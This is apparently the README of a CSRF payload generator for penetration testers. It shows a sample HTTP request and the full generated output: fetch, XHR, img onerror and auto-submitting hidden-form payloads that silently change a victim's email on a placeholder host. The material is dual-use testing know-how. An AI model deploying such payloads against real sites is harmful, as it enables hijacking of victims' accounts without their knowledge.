# csrf-payload-generator
CSRF Payload Generator A powerful and flexible Cross-Site Request Forgery (CSRF) Payload Generator designed for security enthusiasts and penetration testers. This tool automates the generation of CSRF attack payloads based on HTTP requests.

More info about CSRF  
https://portswigger.net/web-security/csrf#what-is-csrf 

Features
* Supports Multiple Payload Methods:
    
    - fetch: Uses the Fetch API to execute CSRF requests programmatically.
    - onerror: Leverages the onerror event of an empty image tag for CSRF execution.
    - form: Auto-submitting HTML forms for CSRF attacks.
    - XHR Requests: Uses XMLHttpRequest to send CSRF payloads.

* HTML Output:
    - Generates an easy-to-use HTML file containing all the CSRF payloads for testing.

* How It Works
    - Input: Supply a raw HTTP request 
    - Process: The tool parses the HTTP request, extracts relevant data, and generates payloads.
    - Output: Produces an HTML file containing the generated payloads for execution.

* Usage
  
  1 - Clone the repository:
  
---
  ```
git clone https://github.com/Abutalib-Zarban/csrf-payload-generator.git

```
 2 - Navigate to the directory:
  ```
cd csrf-payload-generator

```

 3 - Run the script with a  HTTP request file:

```
python3 csrf_generator.py request.txt


```

4- Select the desired CSRF payload method:

    
1. fetch
2. xhr
3. onerror
4. form
5. All
View the output in the csrf_payloads.html file.


* Requirements
    - Python 3.x: The script is written in Python and requires Python 3.x.

 
---------------------------
* Request sample :
* NOTE : If you are using burp , Copy the contetnt of the request and save it to request.txt file , as the tool still not supporting saved items from burp (Working on it )
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com

```

----------------------------
* Tool Output :
    - If all Methods selected 
  
```

<!DOCTYPE html>
<html>
<head><title>CSRF Payloads</title></head>
<body>
    <h1>Generated CSRF Payloads</h1>
<h2>Fetch Payload</h2><pre>
<script>
fetch("http://vulnerable-website.com/email/change", {
    method: "POST",
    mode: "cors",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "email=wiener@normal-user.com"
});
</script>


</pre><hr><h2>Xhr Payload</h2><pre>
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable-website.com/email/change", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=wiener@normal-user.com");
</script>


</pre><hr><h2>Onerror Payload</h2><pre>
<img src="" onerror="fetch('http://vulnerable-website.com/email/change', {
    method: 'POST',
    mode: 'cors',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'email=wiener@normal-user.com'
})" style="display:none;">

</pre><hr><h2>Form Payload</h2><pre>
<form action="http://vulnerable-website.com/email/change" method="POST" target="hidden_iframe">
    <input type="hidden" name="email" value="wiener@normal-user.com">
    <script>
        document.forms[0].submit();
    </script>
</form>
<iframe name="hidden_iframe" style="display:none;"></iframe>
</pre><hr></body></html>

```

------
* Disclaimer
This tool is intended for educational purposes and authorized security testing only. Misuse of this tool may result in legal consequences. Always obtain proper permission before conducting any tests.
 

